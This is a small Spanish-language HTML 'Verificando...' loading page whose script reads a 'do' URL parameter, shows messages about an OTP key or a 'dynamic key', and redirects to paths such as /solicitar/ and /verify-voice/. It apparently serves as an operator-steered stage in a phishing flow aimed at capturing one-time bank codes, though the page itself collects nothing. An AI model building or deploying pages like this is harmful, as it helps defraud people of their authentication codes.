<!DOCTYPE html>
<html><head>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Verificando...</title>
  <style>
    body{background:#742fe1;color:#fff;font-family:Arial;text-align:center;padding:100px;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh}
    .loader{border:16px solid #fff;border-top:16px solid #ff6b6b;border-radius:50%;width:80px;height:80px;animation:s 1s linear infinite}
    @keyframes s{from{transform:rotate(0)}to{transform:rotate(360deg)}}
  </style>
</head><body>
  <h1>Verificando...</h1>
  <div class="loader"></div>

  <script>
    const p = new URLSearchParams(location.search);
    const a = p.get('do');
    const m = {
      otp: ['Tu clave OTP es: 4821', '/solicitar/'],
      dinamica: ['Pide la clave din√°mica', '/verify-voice/'],
      ok: ['Acceso concedido!', '/successful/']
    };
    if (a && m[a]) {
      const [msg, to] = m[a];
      document.body.innerHTML = `<h1>${msg}</h1><p>Redirigiendo...</p><div class="loader"></div>`;
      setTimeout(() => location.href = to, 2000);
    }
  </script>
</body></html>
